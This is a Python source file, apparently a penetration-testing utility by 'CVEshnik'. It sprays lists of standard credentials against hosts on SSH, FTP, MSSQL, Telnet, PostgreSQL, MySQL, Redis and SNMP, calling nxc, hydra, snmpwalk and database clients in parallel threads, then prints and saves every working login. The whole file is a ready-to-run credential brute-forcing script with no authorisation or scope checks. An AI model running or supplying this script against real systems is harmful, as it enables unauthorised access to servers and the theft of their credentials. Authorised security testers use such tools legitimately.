"""
Create by CVEshnik.
Supports SSH, FTP, MSSQL, PostgreSQL, MySQL, Telnet, RDP, SMTP, SNMP, Redis, RabbitMQ.
"""

import json
import os
import subprocess
import sys
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

def print_banner():
    banner = """
    Create by CVEshnik @@ Create by CVEshnik
    ████████████████████████████████████████
    ███████████████▀░▀█████▀████████████████
    ████████▀██████░░░░███░░████▀░██████▀███
    ████████░░░░▀▀░░░░░░░░░░▀▀░░░▄█▀▀▀░░▄███
    ████████░░░░░░░▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░█████
    █████████░░░▄██████████████▄▄░░░░▄██████
    ███▀▀▀░░░░▄█▀▀▀▀███████▀▀▀▀███▄░░▀▀▀▀███
    ███▄░░░░░██░░▄▄▄░▀███▀░░░░░░░██░░░░░░███
    █████▄░░░██░██░██░███░░░░█░░░░██░░░▄████
    ████▀░░░░▀█▄░▀▀▀░▄███▄░░░░░░▄██▀░░██████
    ██▀░░░░░░░░▀██▄▄███▀███▄▄▄██▀▀░░░░░░▀███
    █████▄▄▄░░░░░░▀███▀░▀███▀▀░░░░░░░░▄▄▄▄██
    ███████▀░░░░░░░██████████░░░░░░░░░▀█████
    █████▀░░░░░░░░███████████░░░░░░░░░░░▀███
    ████▄▄▄░░░░░░▄██▀██▀██▀██▄░░░░░░░▀██████
    ██████▀░░▄░░░▀▀░░██░██░░▀▀░░░▄▄▄░░▀█████
    ██████▄▄██░░░░░░▄░░░░░░░░░░░░█████▄▄████
    ████████▀░░░▄████░░░░▄█▄░░░░████████████
    █████████▄▄████████░░██████▄▄███████████
    ████████████████████████████████████████
    Create by CVEshnik @@ Create by CVEshnik
    """
    try:
        print(banner)
    except UnicodeEncodeError:
        print("=" * 50)
        print("         Create by CVEshnik")
        print("=" * 50)

print_banner()
time.sleep(3)

class PentestTool:
    def __init__(self, credentials_file='standard_credentials.json'):
        
        self.credentials_file = credentials_file
        self.credentials = self.load_credentials()
        self.port_service_map = {
            '22': 'ssh',
            '21': 'ftp',
            '23': 'telnet',
            '5432': 'postgresql',
            '1433': 'mssql',
            '3306': 'mysql',
            '3389': 'rdp',
            '25': 'smtp',
            '587': 'smtp',
            '161': 'snmp',
            '6379': 'redis',
            '5672': 'rabbitmq'
        }
        
    def load_credentials(self):
        
        try:
            with open(self.credentials_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print(f"Error: Credentials file {self.credentials_file} not found.")
            sys.exit(1)
        except json.JSONDecodeError:
            print(f"Error: Invalid JSON format in {self.credentials_file}.")
            sys.exit(1)
    
    def scan_directory(self, directory_path):
        
        results = {}
        base_path = Path(directory_path)
        
        if not base_path.exists():
            print(f"Error: Directory {directory_path} does not exist.")
            return results
        
        for port_dir in base_path.iterdir():
            if port_dir.is_dir() and port_dir.name in self.port_service_map:
                service = self.port_service_map[port_dir.name]
                host_file = port_dir / "hosts.txt"
                
                if host_file.exists():
                    with open(host_file, 'r') as f:
                        hosts = [line.strip() for line in f if line.strip()]
                        if hosts:
                            results[service] = {
                                'port': port_dir.name,
                                'hosts': hosts,
                                'host_file': str(host_file)
                            }
        
        return results
    
    def test_ssh(self, host, port, credentials):
        
        for cred in credentials:
            cmd = [
                'nxc', 'ssh',
                host,
                f'-u', cred['username'],
                f'-p', cred['password'],
                '--continue-on-success'
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if 'Authentication successful' in result.stdout or '[+]' in result.stdout:
                    return {
                        'status': '[+] SUCCESS',
                        'host': host,
                        'port': port,
                        'service': 'SSH',
                        'username': cred['username'],
                        'password': cred['password']
                    }
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                continue
        return None
    
    def test_ftp(self, host, port, credentials):
        
        for cred in credentials:
            cmd = [
                'nxc', 'ftp',
                host,
                f'-u', cred['username'],
                f'-p', cred['password'],
                '--continue-on-success'
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if 'Authentication successful' in result.stdout or '[+]' in result.stdout:
                    return {
                        'status': '[+] SUCCESS',
                        'host': host,
                        'port': port,
                        'service': 'FTP',
                        'username': cred['username'],
                        'password': cred['password']
                    }
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                continue
        return None
    
    def test_mssql(self, host, port, credentials):
        
        for cred in credentials:
            cmd = [
                'nxc', 'mssql',
                host,
                f'-u', cred['username'],
                f'-p', cred['password'],
                '--continue-on-success'
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if 'Authentication successful' in result.stdout or '[+]' in result.stdout:
                    return {
                        'status': '[+] SUCCESS',
                        'host': host,
                        'port': port,
                        'service': 'MS SQL',
                        'username': cred['username'],
                        'password': cred['password']
                    }
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                continue
        return None
    
    def test_telnet(self, host, port, credentials):
        for cred in credentials:
            cmd = [
                'hydra',
                f'-l', cred['username'],
                f'-p', cred['password'],
                host,
                'telnet'
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if '[23]' in result.stdout or '[telnet]' in result.stdout:
                    return {
                        'status': '[+] SUCCESS',
                        'host': host,
                        'port': port,
                        'service': 'TELNET',
                        'username': cred['username'],
                        'password': cred['password']
                    }
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                continue
        return None
    
    def test_postgresql(self, host, port, credentials):
        
        for cred in credentials:
            try:
                import psycopg2
                conn = psycopg2.connect(
                    host=host,
                    port=port,
                    user=cred['username'],
                    password=cred['password'],
                    connect_timeout=10
                )
                conn.close()
                return {
                    'status': '[+] SUCCESS',
                    'host': host,
                    'port': port,
                    'service': 'POSTGRE SQL',
                    'username': cred['username'],
                    'password': cred['password']
                }
            except:
                continue
        return None
    
    def test_mysql(self, host, port, credentials):
        
        for cred in credentials:
            try:
                import mysql.connector
                conn = mysql.connector.connect(
                    host=host,
                    port=port,
                    user=cred['username'],
                    password=cred['password'],
                    connection_timeout=10
                )
                conn.close()
                return {
                    'status': '[+] SUCCESS',
                    'host': host,
                    'port': port,
                    'service': 'MY SQL',
                    'username': cred['username'],
                    'password': cred['password']
                }
            except:
                continue
        return None
    
    def test_redis(self, host, port, credentials):
        
        for cred in credentials:
            try:
                import redis
                r = redis.Redis(
                    host=host,
                    port=port,
                    password=cred.get('password', ''),
                    socket_timeout=10
                )
                r.ping()
                return {
                    'status': '[+] SUCCESS',
                    'host': host,
                    'port': port,
                    'service': 'REDIS',
                    'password': cred.get('password', '')     
                }
            except:
                continue
        return None
    
    def test_snmp(self, host, port, credentials):
        
        for cred in credentials:
            cmd = [
                'snmpwalk',
                '-v', '2c',
                '-c', cred['community'],
                host
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    return {
                    'status': '[+] SUCCESS',
                    'host': host,
                    'port': port,
                    'service': 'SNMP',
                    'community': cred['community']
                    }
            except:
                continue
        return None
    
    def test_service(self, service, host, port):
        
        print(f"Testing {service} on {host}:{port}")
        
        if service not in self.credentials:
            return None
        
        test_methods = {
            'ssh': self.test_ssh,
            'ftp': self.test_ftp,
            'mssql': self.test_mssql,
            'telnet': self.test_telnet,
            'postgresql': self.test_postgresql,
            'mysql': self.test_mysql,
            'mariadb': self.test_mysql,
            'redis': self.test_redis,
            'snmp': self.test_snmp
        }
        
        if service in test_methods:
            return test_methods[service](host, port, self.credentials[service])
        
        return None
    
    def run_scan(self, directory_path, max_workers=10):
        
        print(f"Starting scan on directory: {directory_path}")
        print("=" * 50)
        
        # Scan directory structure
        services_data = self.scan_directory(directory_path)
        
        if not services_data:
            print("No valid service directories found.")
            return []
        
        print(f"Found services: {list(services_data.keys())}")
        
        results = []
        tasks = []
        
        
        for service, data in services_data.items():
            port = data['port']
            for host in data['hosts']:
                tasks.append((service, host, port))
        
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_task = {
                executor.submit(self.test_service, service, host, port): (service, host, port)
                for service, host, port in tasks
            }
            
            for future in as_completed(future_to_task):
                service, host, port = future_to_task[future]
                try:
                    result = future.result(timeout=60)
                    if result:
                        results.append(result)
                        print(f"[+] Found credentials: {result['service']} on {result['host']}:{result['port']}")
                        print(f"    Username: {result.get('username', 'N/A')}")
                        print(f"    Password: {result.get('password', result.get('community', 'N/A'))}")
                except Exception as e:
                    print(f"Error testing {service} on {host}:{port} - {str(e)}")
        
        return results
    
    def save_results(self, results, output_file='spraying_results.json'):
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\nResults saved to {output_file}")
    
    def print_summary(self, results):
        
        print("\n" + "=" * 50)
        print("SCAN SUMMARY")
        print("=" * 50)
        
        if not results:
            print("No credentials found.")
            return
        
        print(f"Total credentials found: {len(results)}")
        print("\nDetails:")
        for result in results:
            print(f"\nService: {result['service']}")
            print(f"Host: {result['host']}:{result['port']}")
            if 'username' in result:
                print(f"Username: {result['username']}")
            print(f"Password/Community: {result.get('password', result.get('community', 'N/A'))}")

def main():
    
    if len(sys.argv) != 2:
        print("Usage: python pentest_tool.py <directory_path>")
        print("Example: python pentest_tool.py ./scan_results")
        sys.exit(1)
    
    directory_path = sys.argv[1]
    
    
    tool = PentestTool()
    
    
    results = tool.run_scan(directory_path)
    
    
    tool.save_results(results)
    tool.print_summary(results)

if __name__ == "__main__":
    main()
